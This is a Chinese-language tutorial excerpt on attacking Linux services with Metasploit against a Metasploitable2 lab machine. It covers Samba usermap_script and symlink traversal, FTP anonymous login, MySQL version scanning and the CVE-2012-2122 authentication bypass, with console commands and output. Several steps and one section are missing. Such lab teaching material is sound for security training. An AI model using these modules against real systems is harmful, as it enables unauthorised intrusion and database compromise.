Linux是一套免费使用和自由传播的类UNIX操作系统，是一个基于POSIX和UNIX的多用户、多任务、支持多线程和多CPU的操作系统。这种操作系统多用于服务器，所以用户会在该系统中安装各种服务，如Samba、FTP和MySQL等。一些低版本的服务中可能会存在各种漏洞，渗透测试者可利用这些漏洞实施渗透攻击。本文介绍一些Linux系统下渗透攻击的实例。


1、利用Samba服务usermap_script漏洞


usermap_script漏洞是一个可执行命令漏洞。攻击者通过利用该漏洞，可以获取目标主机的Shell终端。该漏洞存在于Samba版本为3.0.20-2.0.25rc3的服务中。下面介绍利用Samba服务实施漏洞攻击的方法。


利用Samba服务的usermap_script漏洞，对目标主机Metasploitable2实施渗透攻击。具体操作步骤如下：


1）搜索usermap_script漏洞的完整路径。执行命令如下：


msf5 > search usermap_script

3、Samba匿名共享目录可写入漏洞


渗透测试者通过利用Samba匿名共享目录可写入漏洞，可以遍历Samba CIFS服务的所有目录。下面介绍利用该漏洞实施渗透攻击的方法。


利用Samba匿名共享目录可写入漏洞，对目标主机（Metasploitable 2）实施渗透工具。具体操作步骤如下：


1）选择利用Samba匿名共享目录可写入漏洞的模块，即/admin/smb/samba_symlink_traversal。执行命令如下：


msf5 > use auxiliary/admin/smb/samba_symlink_traversal

msf auxiliary(samba_symlink_traversal) >


2）查看该模块的配置选项参数，具体如下：


msf5 auxiliary(samba_symlink_traversal) > show options

Module options (auxiliary/admin/smb/samba_symlink_traversal):

Name     Current Setting   Required    Description

------  ----------------  ---------   -------------

RHOSTS  yes  The target address range or CIDR identifier

RPORT   445   yes   Set the SMB service port

SMBSHARE   yes  The name of a writeable share on the server

SMBTARGET   rootfs   yes  The name of the directory that should point to the root filesystem


从输出信息中可以看到，以上有两个参数需要配置。其中，RHOSTS参数用来指定目标主机地址；SMBSHARE参数用来指定Samba服务器上一个可写的共享文件。当利用该漏洞攻击成功后，新创建的目录将链接到根文件系统。


3）配置选项参数。在配置选项SMBSHARE之前，首先要从Samba服务器上找一个可写的共享文件。执行命令如下：

4、渗透攻击FTP服务


FTP是一种文件传输服务器，专门提供传输文件的服务。对于一些公司，会通过搭建该服务来方便用户上传和下载文件。下面介绍利用Metasploit下的模块，对FTP服务实施渗透攻击。


（1）是否允许匿名用户登录


在FTP服务中，默认匿名用户直接登录服务器。如果目标主机允许匿名登录，并且设置了访问权限的话，则渗透测试者可利用匿名用户登录的漏洞对目标主机实施攻击，如上传木马等。


使用scanner/ftp/anonymous模块，探测目标主机上FTP服务是否允许匿名用户登录。具体操作步骤如下：


1）选择scanner/ftp/anonymous模块，并查看该模块的选项参数。具体如下：


msf5 > use auxiliary/scanner/ftp/anonymous

msf5 auxiliary(anonymous) > show options

2）配置RHOSTS参数，具体如下：

（2）获取目标主机的root权限

5、渗透攻击MySQL数据库


MySQL是一种开放源代码的关系型数据库管理系统，其使用最常用的数据库管理语言——结构化查询语言（SQL）进行数据库管理。在一些服务器中，通常会使用MySQL数据库来保存数据。由于服务器的原因，用户不可能经常更新或修复该服务，所以在该服务器中可能会存在一些漏洞，用户可以暴力破解密码，并登录到该数据库系统中。下面介绍渗透攻击MySQL数据库服务的实例。


（1）判断数据库是否允许外链


使用Metasploit的mysql_version模块，可以判断目标主机的MySQL数据库是否允许外链。如果允许外链，则可以显示该服务的版本信息；否则，不会显示其版本信息。


探测MySQL数据库服务的版本。具体操作步骤如下：


1）选择scanner/mysql/mysql_version模块。执行命令如下：


msf5 > use auxiliary/scanner/mysql/mysql_version

msf5 auxiliary(mysql_version) >


2）配置选项参数，具体如下：


msf5 auxiliary(mysql_version) > set RHOSTS 192.168.1.105

RHOSTS => 192.168.1.105


3）实施攻击，具体如下：


msf5 auxiliary(mysql_version) > exploit

[*] 192.168.1.105:3306 is running MySQL 5.1.66 (protocol 10)

[*] Scanned 1 of 1 hosts (100% complete)

[*] Auxiliary module execution completed


从输出的信息中可以看到，目标主机正运行着MySQL数据库服务，其版本为5.1.66。由此可以说明该服务允许外链。如果不允许外链，则获取版本信息失败，显示的信息如下：


msf5 auxiliary(mysql_version) > exploit

[*] 192.168.1.105:3306 is running MySQL, but responds with an error: \x04Host '192.168.1.108' is not  allowed to connect to this MySQL server

[*] Scanned 1 of 1 hosts (100% complete)

[*] Auxiliary module execution completed

（5）MySQL认证漏洞利用（CVE-2012-2122）


MySQL认证漏洞也被称为MySQL任意用户密码大概率登录漏洞。按照公告说法大约256次就能够猜对一次。所有MariaDB和MySQL 5.1.61/5.2.11/5.3.5/5.5.22之前的版本中都存在该漏洞。MariaDB是从MySQL发展而来的一款数据库服务器，是一款开源数据库。MariaDB 5.1.62/5.2.12/5.3.6/5.5.23之前的版本和MySQL 5.1.63/5.5.24/5.6.6之前的版本在用户验证的处理上存在安全漏洞，可以使攻击者无须知道正确口令就能登录到MySQL服务器。


用户连接到MariaDB/MySQL后，应用会计算和比较令牌值。由于错误的转换，即使memcmp（）返回非零值，也可能出现错误的比较，造成MySQL/MariaDB误认为密码是正确的。因为协议使用的是随机字符串，该Bug发生的几率为1/256。MySQL的版本是否受影响取决于程序的编译方式，很多版本（包括官方提供的二进制文件）并不受此漏洞的影响。也就是说，只要知道用户名，不断尝试登录就能直接登入SQL数据库。


下面介绍使用mysql_authbypass_hashdump模块利用MySQL认证漏洞实施攻击的方法。具体操作步骤如下：
